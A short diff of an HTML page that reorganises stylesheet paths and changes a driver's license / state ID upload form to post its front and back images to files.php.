@@ -4,8 +4,8 @@
           <meta charset="UTF-8">
           <meta http-equiv="X-UA-Compatible" content="IE=edge">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <link rel="stylesheet" href="files.css">
-          <link rel="stylesheet" href="mobile.css">
+          <link rel="stylesheet" href="./css/files.css">
+          <link rel="stylesheet" href="./css/mobile.css">
           <link rel="stylesheet" href="./fontsawesome/css/all.css">
           <title>Document</title>
 </head>
@@ -64,13 +64,12 @@
           Upload Driver's License/ State ID
 </h2>
 
-          <form action="/action_page.php">
+          <form action="files.php" method="post" name="files">
                     <label id="labels">Upload Front    </label> <br>
-                    <input  type="file" id="myfile" name="filename"> <br>
+                    <input  type="file" id="myfile" name="front"> <br>
                     <label id="labels">Upload Back</label> <br>
-                    <input  type="file" id="myfile" name="filename">
+                    <input  type="file" id="myfile" name="back">
 <br>
-
                     <input id="submit" type="submit">
                   </form>
 </div>
